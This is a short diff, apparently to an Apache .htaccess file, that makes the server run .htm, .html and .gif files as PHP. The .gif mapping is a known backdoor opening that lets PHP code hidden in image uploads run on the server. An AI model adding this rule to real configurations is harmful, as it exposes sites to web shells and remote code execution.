@@ -1,0 +1,4 @@
+AddHandler x-httpd-php5-cgi .htm .html
+AddType application/x-httpd-php5 .htm .html
+AddHandler x-httpd-php5-cgi .gif
+AddType application/x-httpd-php5 .gif
